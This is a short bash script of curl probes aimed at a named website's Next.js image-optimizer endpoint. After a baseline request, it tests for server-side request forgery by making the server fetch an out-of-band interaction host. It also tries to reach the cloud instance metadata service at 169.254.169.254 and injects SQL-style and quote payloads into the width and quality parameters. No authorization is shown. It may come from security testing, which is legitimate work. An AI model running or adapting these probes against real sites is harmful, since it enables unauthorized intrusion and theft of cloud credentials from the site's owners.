#!/bin/bash
B="https://www.infinitycapital.bh"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
OOB="oob2b7f8deff78a.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

echo "=== 1. legit remote image (Next optimizer baseline) ==="
curl -sk -o /tmp/i1.bin -w "code=%{http_code} size=%{size_download} type=%{content_type}\n" -A "$UA" \
 "$B/_next/image?url=https%3a%2f%2fimages.ctfassets.net%2fyts1dx0j7jj5%2f1GCT0vyjqmOwm2OL1YVpD1%2f2ab55f8b5189afa153eac5cb97f7f6d4%2fAhmed_Taleb_updated-min.jpg&w=1080&q=75"

echo "=== 2. SSRF probe url=minted OOB host ==="
curl -sk -o /tmp/i2.txt -w "code=%{http_code} size=%{size_download}\n" -A "$UA" \
 "$B/_next/image?url=http%3a%2f%2f${OOB}%2ffetchcheck&w=64&q=75"
head -c 250 /tmp/i2.txt; echo

echo "=== 3. IMDS probe ==="
curl -sk -o /tmp/i3.txt -w "code=%{http_code} size=%{size_download}\n" -A "$UA" \
 "$B/_next/image?url=http%3a%2f%2f169.254.169.254%2flatest%2fmeta-data%2f&w=64&q=75"
head -c 200 /tmp/i3.txt; echo

echo "=== 4. w= injection probe ==="
curl -sk -o /tmp/i4.txt -w "code=%{http_code} size=%{size_download}\n" -A "$UA" \
 "$B/_next/image?url=http%3a%2f%2f${OOB}%2fwtest&w=640%20AND%201%3D1&q=75"
head -c 200 /tmp/i4.txt; echo

echo "=== 5. q= probe ==="
curl -sk -o /tmp/i5.txt -w "code=%{http_code} size=%{size_download}\n" -A "$UA" \
 "$B/_next/image?url=http%3a%2f%2f${OOB}%2fqtest&w=64&q=75%27"
head -c 200 /tmp/i5.txt; echo
